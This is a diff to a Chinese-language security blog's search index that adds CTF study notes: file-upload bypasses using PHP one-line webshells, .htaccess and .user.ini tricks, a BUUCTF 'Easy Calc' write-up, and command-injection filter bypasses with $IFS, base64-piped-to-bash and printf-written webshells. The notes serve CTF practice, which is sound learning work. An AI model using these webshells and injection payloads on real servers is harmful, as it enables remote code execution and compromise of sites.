@@ -1,6 +1,137 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>文件上传</title>
+    <url>/2020/08/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<p>首先，先是最简单的一句话木马的上传，即没有任何阻碍：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;ag&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果上传成功即可以用antsword去连接。</p>
+<blockquote>
+<p>有些时候POST请求可能会出问题，这时我们可以改为GET或者REQUEST</p>
+</blockquote>
+<h3 id="后缀验证"><a href="#后缀验证" class="headerlink" title="后缀验证"></a>后缀验证</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$extension = substr($name, strrpos($name, <span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">   <span class="keyword">if</span> (preg_match(<span class="string">"/ph|htacess/i"</span>, $extension)) &#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"illegal suffix!"</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>有时后缀会过滤php，但我们可以使用phtml、php5等等的后缀，可是这里过滤掉了所有ph开头的后缀，同时过滤了.htacess文件。</p>
+<p>此时我们就只能改后缀为.jpg或者.png，来上传一句话木马。</p>
+<h3 id="lt-验证"><a href="#lt-验证" class="headerlink" title="&lt;?验证"></a>&lt;?验证</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (mb_strpos(file_get_contents($tmp_name), <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"&amp;lt;? in contents!"</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里过滤掉了&lt;?字符，所以我们就需要使用一句话木马的变种：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;ag&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="exif-imagetype验证"><a href="#exif-imagetype验证" class="headerlink" title="exif_imagetype验证"></a>exif_imagetype验证</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$image_type = exif_imagetype($tmp_name);</span><br><span class="line">    <span class="keyword">if</span> (!$image_type) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"exif_imagetype:not image!"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个应该是验证一个文件头是否属于图片，我们可以伪造图片的文件头，一般我们使用：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
+
+<p>整体一句话木马就变成了：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;ag&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="user-ini（让-jpg文件被解析成-php）"><a href="#user-ini（让-jpg文件被解析成-php）" class="headerlink" title=".user.ini（让.jpg文件被解析成.php）"></a>.user.ini（让.jpg文件被解析成.php）</h3><blockquote>
+<p>那么什么是.user.ini？</p>
+<p>这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。 在此可以查看：<a href="http://php.net/manual/zh/ini.list.php" target="_blank" rel="noopener">http://php.net/manual/zh/ini.list.php</a> 这几种模式有什么区别？看看官方的解释：</p>
+<p><img src="https://wooyun.js.org/images_result/images/2014103002272568560.png" alt="enter image description here"></p>
+<p>其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在<a href="http://php.net/manual/zh/configuration.file.per-user.php" target="_blank" rel="noopener">这里</a>又解释了：</p>
+<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
+<p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>
+<p>这里就很清楚了，<code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p>
+<p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。</p>
+<p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>
+<p>然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是<code>PHP_INI_SYSTEM</code>模式的（甚至是php.ini only的），包括<code>disable_functions</code>、<code>extension_dir</code>、<code>enable_dl</code>等。 不过，我们可以很容易地借助<code>.user.ini</code>文件来构造一个“后门”。</p>
+<p>Php配置项中有两个比较有意思的项（下图第一、四个）：</p>
+<p><img src="https://wooyun.js.org/images_result/images/2014103002272554789.png" alt="enter image description here"></p>
+<p><code>auto_append_file</code>、<code>auto_prepend_file</code>，点开看看什么意思：</p>
+<p><img src="https://wooyun.js.org/images_result/images/2014103002272569525.png" alt="enter image description here"></p>
+<p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。</p>
+</blockquote>
+<p>那么使用方法就很明显了，我们先上传一个.user.ini，里面写：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file&#x3D;a.jpg</span><br></pre></td></tr></table></figure>
+
+<p>然后再上传一个a.jpg，里面写着一句话木马，这样在所有该网站根目录下的网页，都会包含a.jpg的内容（也就是一句话木马）。</p>
+<blockquote>
+<p>例题：[SUCTF 2019]CheckIn</p>
+</blockquote>
+<h3 id="htaccess（让-jpg文件被解析成-php）"><a href="#htaccess（让-jpg文件被解析成-php）" class="headerlink" title=".htaccess（让.jpg文件被解析成.php）"></a>.htaccess（让.jpg文件被解析成.php）</h3><h6 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># FileMatch 参数即为文件名的正则匹配</span></span><br><span class="line">&lt;FilesMatch <span class="string">"sniperoj"</span>&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// sniperoj</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'ag'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// filename.jpg</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'ag'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h6><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 自解析的 .htaccess</span><br><span class="line"><span class="tag">&lt;<span class="name">Files</span> "\<span class="attr">.htaccess</span>"&gt;</span></span><br><span class="line">    Allow from all</span><br><span class="line"><span class="tag">&lt;/<span class="name">Files</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> "\<span class="attr">.htaccess</span>"&gt;</span></span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line"># <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[ag]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line"># 不过这种方式测试并没有成功... 暂时不清楚原因</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="一些思考"><a href="#一些思考" class="headerlink" title="一些思考"></a>一些思考</h2><h3 id="防止-htaccess和-user-ini方法"><a href="#防止-htaccess和-user-ini方法" class="headerlink" title="防止.htaccess和.user.ini方法"></a>防止.htaccess和.user.ini方法</h3><p>对所有的文件名进行加密或者哈希，这样这种拥有特殊名字的文件就会改变文件名（虽然后缀不变），也就不会再被解析，也就消除了漏洞。</p>
+]]></content>
+      <categories>
+        <category>web安全漏洞</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>buuctf刷题记录</title>
+    <url>/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>查看源代码，发现存在waf（<em>Web Application Firewall</em>）：</p>
+<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/easycalc1.png" alt="easycalc1"></p>
+<p>找到calc.php，打开发现如下源代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:26375&#x2F;calc.php? num&#x3D;a</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>为什么要在num前加一个空格？</p>
+<p>答：假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
+<p>发现过滤怎么办？</p>
+<p>答：用chr()转ascii再进行拼接</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:26375&#x2F;calc.php? num&#x3D;phpinfo()</span><br></pre></td></tr></table></figure>
+
+<p>发现可以正常运行，于是扫描根目录：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:26375&#x2F;calc.php? num&#x3D;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>
+
+<p>其中47转化为“/”，也就是扫描根目录，得到：</p>
+<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/easycalc2.png" alt="easycalc2"></p>
+<p>接着打开这个f1agg即可：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:26375&#x2F;calc.php? num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></figure>
+
+<p>这些字符转化过来就是：/f1agg</p>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;calc.php? num&#x3D;var_dump(base_convert(61693386291,10,36)(hex2bin(dechex(47))))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/easycalc3.png" alt="easycalc3"></p>
+<p>这里其实是在利用当数字大于10时，其就会用字母表示，而36进制即可以表示出所有的字母</p>
+<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/easycalc4.png" alt="easycalc4"></p>
+<p>又发现dechex函数可以把10进制转换为16进制，而hex2bin将十六进制数转换为ASCII</p>
+<p>可以构造出readfile(/f1agg)来读取文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">构造为：base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36))</span><br></pre></td></tr></table></figure>
+
+<p>当然也可以构造file_get_contents()，只不过可能比较麻烦，因为字母和下划线所用的函数不同，要叠加来叠加去</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;calc.php? num&#x3D;(base_convert(723938,10,36).hex2bin(dechex(95)).base_convert(21269,10,36).hex2bin(dechex(95)).base_convert(994052860192,10,36))</span><br><span class="line">(hex2bin(dechex(47)).base_convert(25254448,10,36))</span><br></pre></td></tr></table></figure>
+
+<p>解析出来就是file_get_contents(/f1agg)</p>
+]]></content>
+      <tags>
+        <tag>BUU</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>php伪协议</title>
     <url>/2020/07/29/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
     <content><![CDATA[<h1 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h1><p>简单来说好像就是获取POST的数据，具体的还是来看实例吧</p>
@@ -5440,6 +5571,7 @@ qVlRFz1v/9k=
 <h4 id="JS验证"><a href="#JS验证" class="headerlink" title="JS验证"></a>JS验证</h4><ol>
 <li>可以进用JS</li>
 <li>可以f12查看源代码，然后把有关验证JS的链接给删除。</li>
+<li>抓包绕过前端检测【[ACTF2020 新生赛]Upload】</li>
 </ol>
 <h4 id="内容验证"><a href="#内容验证" class="headerlink" title="内容验证"></a>内容验证</h4><p>即后缀名可以随便修改，但是文件内容必须符合，比如要求文件格式为jpg。</p>
 <p>此时我们就可以把一句话隐写到php文件里，形成图片一句话，从而绕过验证。</p>
@@ -6161,9 +6293,35 @@ ca\t fl\ag.php
 ca&apos;&apos;t fla&apos;&apos;g.txt
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 过滤空格</span><br><span class="line"></span><br><span class="line">在 bash 下, 可以用以下字符代替空格：</span><br></pre></td></tr></table></figure>
 &lt;,&lt;&gt;,%20(space),%09(tab),$IFS$9, ${IFS},$IFS 等
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 过滤目录分隔符[&#x2F;]</span><br><span class="line"></span><br><span class="line">可以使用cd命令直接进入那个目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 一个综合过滤练习</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res &#x3D; FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;</span><br><span class="line">    $ip &#x3D; $_GET[&#39;ip&#39;];</span><br><span class="line">    $m &#x3D; [];</span><br><span class="line">    if (!preg_match_all(&quot;&#x2F;(\||&amp;|;| |\&#x2F;|cat|flag|ctfhub)&#x2F;&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd &#x3D; &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res &#x3D; $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 过滤目录分隔符[&#x2F;]</span><br><span class="line"></span><br><span class="line">可以使用cd命令直接进入那个目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 花括号</span><br><span class="line"></span><br><span class="line">&#123;cat,flag&#125; 逗号代替空格</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; ### 黑名单绕过</span><br><span class="line">&gt;</span><br><span class="line">&gt; 拼接绕过:相当于ls</span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+&gt; $a=l;$b=s;$a$b
+&gt; <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">编码绕过：</span><br><span class="line"></span><br><span class="line">**base64：**</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;bash</span><br><span class="line">echo MTIzCg&#x3D;&#x3D;|base64 -d 其将会打印123</span><br><span class="line">echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
+&gt;
+&gt; **hex:**
+&gt;
+&gt; <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"636174202f666c6167"</span> | xxd -r -p|bash ==&gt;cat /flag</span><br></pre></td></tr></table></figure>
+&gt;
+&gt; **oct：**
+&gt;
+&gt; <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">printf</span> <span class="string">"\154\163"</span>) ==&gt;ls</span><br><span class="line">$(<span class="built_in">printf</span> <span class="string">"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"</span>) ==&gt;cat /flag</span><br><span class="line">&#123;<span class="built_in">printf</span>,<span class="string">"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"</span>&#125;|\<span class="variable">$0</span> ==&gt;cat /flag</span><br><span class="line"><span class="comment">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST['c']);?&gt;</span></span><br><span class="line"><span class="variable">$&#123;printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"&#125;</span> &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>
+
+
 </code></pre></li>
 </ul>
+<h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><p>长度限制可以用文件构造的方式来绕过。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">linux下可以用 1&gt;a创建文件名为a的空文件</span><br><span class="line">ls -t&gt;<span class="built_in">test</span>则会将目录按时间排序后写进<span class="built_in">test</span>文件中</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h3><p>命令替代，大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。类似的还有$(command).</p>
+<blockquote>
+<p>cat$IFS<code>ls</code>    //带反引号</p>
+</blockquote>
+<blockquote>
+<p>cat$IFS$(ls)</p>
+</blockquote>
+<h3 id="综合过滤练习1"><a href="#综合过滤练习1" class="headerlink" title="综合过滤练习1"></a>综合过滤练习1</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$res = <span class="keyword">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]) &amp;&amp; $_GET[<span class="string">'ip'</span>]) &#123;</span><br><span class="line">    $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">    $m = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">"/(\||&amp;|;| |\/|cat|flag|ctfhub)/"</span>, $ip, $m)) &#123;</span><br><span class="line">        $cmd = <span class="string">"ping -c 4 &#123;$ip&#125;"</span>;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>我们可以看到,过滤掉了</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|   &amp;   ;   &#x2F;   cat   flag   ctfhub</span><br></pre></td></tr></table></figure>
 
@@ -6195,6 +6353,28 @@ ca&apos;&apos;t fla&apos;&apos;g.txt
 
 <p>但是好像并不成功,直接无法写入,然后我尝试者写一些普通文本到123.php或122.txt,写入倒是都可以成功写入,问题就是这些文件打不开???base64编码也没有反应,很迷,但我有招一日一定要注入进去!加油!</p>
 <p><a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">RCE的综合过滤练习</a></p>
+<h3 id="综合过滤练习2"><a href="#综合过滤练习2" class="headerlink" title="综合过滤练习2"></a>综合过滤练习2</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your symbol!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/ /"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your space!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/bash/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your bash!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your flag!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;ls</span><br></pre></td></tr></table></figure>
+
+<p>发现：</p>
+<p><img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/l2_1.png" alt="l2_1"></p>
+<p>于是开始实验空格，最后发现$IFS$1可以成功替代空格</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;cat$IFS$1index.php</span><br></pre></td></tr></table></figure>
+
+<p>但是还会过滤flag，所有就如下即可获得flag</p>
+<p><strong>方法1（内联）</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;cat$IFS$1&#96;ls&#96;</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法2（拼接）</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法3（编码）</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
+
+<p>这个编码的方法还没有看的特别懂。。。测试还存在一些问题</p>
 ]]></content>
       <categories>
         <category>web安全漏洞</category>
